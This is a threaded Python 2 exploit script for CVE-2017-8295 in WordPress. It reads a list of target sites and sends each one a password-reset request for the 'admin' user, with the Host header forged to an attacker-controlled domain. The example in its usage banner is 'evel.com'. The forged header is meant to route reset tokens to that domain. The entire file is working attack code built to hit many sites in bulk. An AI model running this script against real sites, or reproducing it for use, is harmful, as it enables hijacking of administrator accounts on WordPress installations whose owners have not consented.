# /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Author: @intx0x80 
# Improved by: @proclnas 

import requests
import os
import argparse
import sys
from threading import Thread, Event, Lock
from Queue import Queue


class WpResetPassword:
    def __init__(self, uri_file, domain, threads):
        self.uri_file = uri_file
        self.domain = domain
        self.q = Queue()
        self.t_stop = Event()
        self.threads = threads
        self.list_size = len(open(uri_file).readlines())
        self.counter = 0
        self.terminal = sys.stdout
        self.lock = Lock()

    def save_buf(self, content, output):
        with open(output, 'a+') as fp:
            fp.write('{}\n'.format(content.encode('UTF-8')))

    def send_payload(self, q):
        while not self.t_stop.is_set():
            self.t_stop.wait(1)

            try:
                host = q.get()
                session = requests.Session()
                inject = self.domain

                with self.lock:
                    self.terminal.write(
                        '[{}]{}\n'.format(inject, host)
                    )

                paramsGet = {
                    'action': 'lostpassword'
                }

                paramsPost = {
                    'wp-submit':'Get New Password',
                    'user_login':'admin',
                    'redirect_to':'wp-submit'
                }

                headers = {
                    'Host':inject,
                    'Accept-Language':'en-US,en;q=0.5',
                    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:53.0) Gecko/20100101 Firefox/53.0',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Content-Type':'application/x-www-form-urlencoded',
                    'Connection':'close'
                }

                response = session.post(
                    '{}{}'.format(host, '/wp-login.php'), 
                    data=paramsPost, 
                    params=paramsGet, 
                    headers=headers
                )

                with self.lock:
                    self.terminal.write(
                        '[{}] Completed  check inbox [*]\n'.format(
                            host
                        )
                    )

            except:
                pass
            finally:
                self.counter += 1
                q.task_done()

    def start(self):
        for _ in xrange(self.threads):
            t = Thread(target=self.send_payload, args=(self.q,))
            t.setDaemon(True)
            t.start()

        for uri in open(self.uri_file):
            if uri:
                self.q.put(uri.strip())

        try:
            while not self.t_stop.is_set():
                self.t_stop.wait(1)
                if self.counter == self.list_size:
                    self.t_stop.set()

        except KeyboardInterrupt:
            print '~ Sending signal to kill threads...'
            self.t_stop.set()
            exit(0)

        self.q.join()
        print 'Finished!'


if __name__ == '__main__':
    banner = '''
     _______      ________    ___   ___  __ ______      ___ ___   ___  _____ 
    / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |    / _ \__ \ / _ \| ____|
    |      \ \  / /| |__ ______ ) | | | || |   / /____| (_) | ) | (_) | |__  
    | |     \ \/ / |  __|______/ /| | | || |  / /______> _ < / / \__, |___ \ 
    | |____  \  /  | |____    / /_| |_| || | / /      | (_) / /_   / / ___) |
     \_____|  \/   |______|  |____|\___/ |_|/_/        \___/____| /_/ |____/ 
             

    [CVE-2017-8295]                                       
    - Release date: 03.05.2017                            
    - Revision 1.0                                        
    - Severity: Medium/High

    https://www.exploit-db.com/exploits/41963/           
    ./CVE-2017-8295.py [Option]      

    -u /--url :: target url                               
    -d /--domain :: inject Domain server
    -t /--threads :: Threads                  

    usage:                                              
    ./CVE-2017-8295.py -f wp-list -d domain-to-inject -t threads             
    ./CVE-2017-8295.py -f wp-list -d evel.com -t 15    
    Author:  @intx0x80 

    Improved by: @proclnas 

    v1.1
    '''

    parser = argparse.ArgumentParser(
        description='reset password'
    )

    parser.add_argument(
        '-f', '--file',
        action='store',
        dest='uri_file',
        help=''
    )

    parser.add_argument(
        '-d', '--domain',
        action='store',
        dest='domain',
        help='Domain, ex: site.com'
    )

    parser.add_argument(
        '-t', '--threads',
        action='store',
        default=1,
        dest='threads',
        help='Concurrent workers',
        type=int
    )

    args = parser.parse_args()

    if not args.uri_file or not args.domain:
        print banner
        exit(parser.print_help())

    if not os.path.isfile(args.uri_file):
        exit('File {} not found'.format(args.uri_file))

    print '''    
     _______      ________    ___   ___  __ ______      ___ ___   ___  _____ 
    / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |    / _ \__ \ / _ \| ____|
    |      \ \  / /| |__ ______ ) | | | || |   / /____| (_) | ) | (_) | |__  
    | |     \ \/ / |  __|______/ /| | | || |  / /______> _ < / / \__, |___ \ 
    | |____  \  /  | |____    / /_| |_| || | / /      | (_) / /_   / / ___) |
     \_____|  \/   |______|  |____|\___/ |_|/_/        \___/____| /_/ |____/
     v1.1 
    '''

    wpResetPassword = WpResetPassword(
        args.uri_file,
        args.domain,
        args.threads
    )
    wpResetPassword.start()
